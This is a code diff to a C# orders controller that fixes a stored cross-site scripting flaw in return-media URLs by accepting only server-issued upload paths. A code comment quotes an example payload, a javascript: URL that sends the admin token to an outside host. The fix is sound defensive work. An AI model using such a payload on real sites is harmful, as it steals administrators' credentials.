@@ -1818,10 +1818,10 @@ public class OrdersController : ControllerBase
             returnCallback    = req.Callback?.Trim() ?? "",
             returnMedia       = new
             {
-                openingVideo  = req.OpeningVideo?.Trim() ?? "",
-                closingVideo  = req.ClosingVideo?.Trim() ?? "",
-                openingPhotos = (req.OpeningPhotos ?? new List<string>()).Where(u => !string.IsNullOrWhiteSpace(u)).Take(4).ToList(),
-                closingPhotos = (req.ClosingPhotos ?? new List<string>()).Where(u => !string.IsNullOrWhiteSpace(u)).Take(4).ToList()
+                openingVideo  = OurMedia(req.OpeningVideo),
+                closingVideo  = OurMedia(req.ClosingVideo),
+                openingPhotos = OurMediaList(req.OpeningPhotos),
+                closingPhotos = OurMediaList(req.ClosingPhotos)
             }
         }, _json);
         order.Status = "Return Requested";
@@ -1859,6 +1859,35 @@ public class OrdersController : ControllerBase
 
         return Ok(new { success = true, order = MapOrder(order) });
     }
+
+    // A return media URL is only ever one this server handed out.
+    //
+    // These four fields were stored exactly as sent, and the admin Orders
+    // screen renders them as <video src> and as <a href> (admin/orders/page.tsx
+    // around line 1274). So "javascript:fetch('https://elsewhere/?t='+
+    // localStorage.adminToken)" submitted as a return video became a link in
+    // the admin origin - which is where the admin token is kept - waiting for
+    // the owner to click it while reading the return.
+    //
+    // UploadReturnMedia below answers with exactly one shape,
+    // "/api/orders/return-media/{order}/{name}", so anything else was never
+    // ours. Same rule ExchangesController.cs:174 and ReviewsController.cs:258
+    // already apply to their own uploads; these were simply missed.
+    private const string MediaPrefix = "/api/orders/return-media/";
+
+    private static string OurMedia(string? url)
+    {
+        var u = (url ?? "").Trim();
+        return u.StartsWith(MediaPrefix, StringComparison.Ordinal) ? u : "";
+    }
+
+    private static List<string> OurMediaList(List<string>? urls) =>
+        (urls ?? new List<string>())
+            .Select(u => (u ?? "").Trim())
+            .Where(u => u.StartsWith(MediaPrefix, StringComparison.Ordinal))
+            .Distinct(StringComparer.Ordinal)
+            .Take(4)
+            .ToList();
 
     // POST /api/orders/{orderId}/return-media  — upload ONE return photo/video (called per file)
     // kind ∈ { openingVideo, closingVideo, openingPhoto, closingPhoto }
